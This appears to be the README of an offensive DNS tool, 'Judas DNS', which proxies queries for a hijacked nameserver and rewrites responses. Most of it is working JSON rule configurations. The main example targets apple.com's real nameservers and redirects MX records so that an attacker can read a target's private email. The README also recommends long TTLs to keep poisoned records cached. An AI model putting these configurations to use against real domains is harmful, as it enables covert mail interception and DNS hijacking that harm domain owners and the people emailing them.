# Judas DNS
```
                                                   
                          ,,                                                        
   `7MMF'               `7MM                       `7MM"""Yb. `7MN.   `7MF'.M"""bgd 
     MM                   MM                         MM    `Yb. MMN.    M ,MI    "Y 
     MM `7MM  `7MM   ,M""bMM   ,6"Yb.  ,pP"Ybd       MM     `Mb M YMb   M `MMb.     
     MM   MM    MM ,AP    MM  8)   MM  8I   `"       MM      MM M  `MN. M   `YMMNq. 
     MM   MM    MM 8MI    MM   ,pm9MM  `YMMMa.       MM     ,MP M   `MM.M .     `MM 
(O)  MM   MM    MM `Mb    MM  8M   MM  L.   I8       MM    ,dP' M     YMM Mb     dM 
 Ymmm9    `Mbod"YML.`Wbmd"MML.`Moo9^Yo.M9mmmP'     .JMMmmmdP' .JML.    YM P"Ybmmd"  

                                         Nameserver DNS poisoning attacks made easy
```
A DNS proxy server built to be deployed in place of a taken over nameserver to perform targeted exploitation. Judas works by proxying all DNS queries to the legitimate nameservers for a domain. The magic comes with Judas's rule configurations which allow you to change DNS responses depending on source IP or DNS query type. This allows an attacker to configure a malicious nameserver to do things like selectively re-route inbound email coming from specified source IP ranges (via modified MX records), set extremely long TTLs to keep poisoned records cached, and more.

# How Do I Take Over a Nameserver?
For more information on taking over nameservers and hijacking DNS, see the following blog post titled ["Respect My Authority – Hijacking Broken Nameservers to Compromise Your Target"](https://thehackerblog.com/respect-my-authority-hijacking-broken-nameservers-to-compromise-your-target/).

# Example Config
The following is an example configuration for Judas for an example scenario where an attacker has comprimised/taken over one of Apple's authoritative nameservers (for `apple.com`):

```json
{
    "version": "1.0.0",
    "port": 2248,
    "dns_query_timeout": 10000,
    "target_nameservers": [ "17.254.0.59", "17.254.0.50", "17.112.144.50", "17.112.144.59", "17.171.63.30", "17.171.63.40", "17.151.0.151", "17.151.0.152" ],
    "rules": [
        {
            "name": "Secretly redirect all emails coming from 127.0.0.1!",
            "query_type_matches": [ "MX" ],
            "ip_range_matches": [ "127.0.0.1/32" ],
            "modifications": [
                {
                    "answer": [
                        {
                            "name": "apple.com",
                            "type": 15,
                            "class": 1,
                            "ttl": 10,
                            "priority": 10,
                            "exchange": "hacktheplace.localhost"
                        }
                    ]
                }
            ]
        },
        {
            "name": "Make all responses NOERROR even if they've failed.",
            "query_type_matches": [ "*" ],
            "modifications": [
                {
                    "header": {
                        "rcode": 0
                    }
                }
            ]
        }
    ]
}
```
The above configuration value purposes are the following:

* `version`: The configuration file format version (for now is always `1.0.0`).
* `port`: The port Judas should run on.
* `dns_query_timeout`: How long to wait in milliseconds before giving up on a reply from the upstream target nameserver.
* `target_nameservers`: The legit nameservers for your target domain, all DNS queries will be sent here from Judas on behalf of all requesting clients.
* `rules`: A list of rules with modifications to the DNS response to apply if matched.
	* `name`: Name of a given rule.
	* `query_type_matches`: List of query types to match on such as `CNAME`, `A`, etc. A wildcard (`*`) can also be specified to match any query type.
	* `ip_range_matches`: List of IP ranges to match on. For selectively spoofing responses to a specific range of IPs.
	* `modifications`: See the "Modifications" section of this README.

# Modifications
Judas's rules come with a `modifications` specification which is set to a list of varying modifications to make to the DNS response before it is sent back to the client. It is important that you read the [`node-dns` documentation](https://github.com/tjfontaine/node-dns#packet) to understand the DNS response structure so you can modify it.

An example DNS response format is the following:

```
{ header: 
   { id: 25373,
     qr: 1,
     opcode: 0,
     aa: 1,
     tc: 0,
     rd: 1,
     ra: 0,
     res1: 0,
     res2: 0,
     res3: 0,
     rcode: 5 },
  question: [ { name: 'apple.com', type: 2, class: 1 } ],
  answer: 
   [ { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'nserver2.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'nserver4.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'nserver.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'nserver3.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'nserver5.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'nserver6.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'adns2.apple.com' },
     { name: 'apple.com',
       type: 2,
       class: 1,
       ttl: 86400,
       data: 'adns1.apple.com' } ],
  authority: [],
  additional: [],
  edns_options: [],
  payload: undefined,
  address: undefined,
...trimmed for brevity...
```
(For more information on the DNS response data structure see [this documentation](https://github.com/tjfontaine/node-dns#packet).)

Writing a modification is very simple, an example rule with modification can be seen below:

```json
{
  "name": "Make all responses NOERROR even if they've failed.",
  "query_type_matches": [ "*" ],
  "modifications": [
    {
      "header": {
        "rcode": 0
      }
    }
  ]
}
```

The above rule matches any query type (due to the wildcard (`*`)) and sets the `header.rcode` value of the DNS response to `0`. Whatever object is set as a modification element is merged into the DNS response - replacing whatever value was originally set.

Another example is the following:

```json
{
  "name": "Secretly redirect all emails coming from 127.0.0.1!",
  "query_type_matches": [ "MX" ],
  "ip_range_matches": [ "127.0.0.1/32" ],
  "modifications": [
    {
      "answer": [
        {
          "name": "apple.com",
          "type": 15,
          "class": 1,
          "ttl": 10,
          "priority": 10,
          "exchange": "hacktheplace.localhost"
        }
      ]
    }
  ]
}
```

The above rule matches any `MX` query from `127.0.0.1`. The DNS response answer is overwritten with a single MX record for `hacktheplace.localhost`. A real world implementation of this would be to redirect inbound emails from a specific IP in order to read private emails of your target. Additionally an attacker in a real world scenario may also choose to modify the response TTL to be a very high value in order to persist their malicious records in client DNS caches as long as possible.

# Rule Match Types

## Requester IP
The following rule will match on a client's IP address:

```json
{
  "name": "Make all responses requested from localhost (127.0.0.1) NOERROR.",
  "ip_range_matches": [ "127.0.0.1/32" ],
  "modifications": [
    {
      "header": {
        "rcode": 0
      }
    }
  ]
}
```

The `ip_range_matches` field is set to an array of IP ranges which specify the target ranges to apply the response modification to. Omission of this field is equivalent to a wildcard and will match all client IP addresses.

## Request Query Type
The following rule will match on a query type of `MX` and `CNAME` and apply a response modification accordingly:

```json
{
  "name": "Make all responses NOERROR even if they've failed.",
  "query_type_matches": [ "MX", "CNAME" ],
  "modifications": [
    {
      "header": {
        "rcode": 0
      }
    }
  ]
}
```

The `query_type_matches` field is set to an array of query types to match against. Omission of this field is equivalent to a wildcard and will match all query types.

## Response Status Code

The following rule with match on a response code of `NXDOMAIN` and will apply a response modification accordingly:

```json
{
  "name": "Make all responses requested from localhost (127.0.0.1) NOERROR.",
  "response_code_matches": [ "NXDOMAIN" ],
  "modifications": [
    {
      "header": {
        "rcode": 0
      }
    }
  ]
}
```

The `response_code_matches` field is set to an array of response codes to match against. Omission of this field is equivalent to a wildcard and will match all RCODE types.

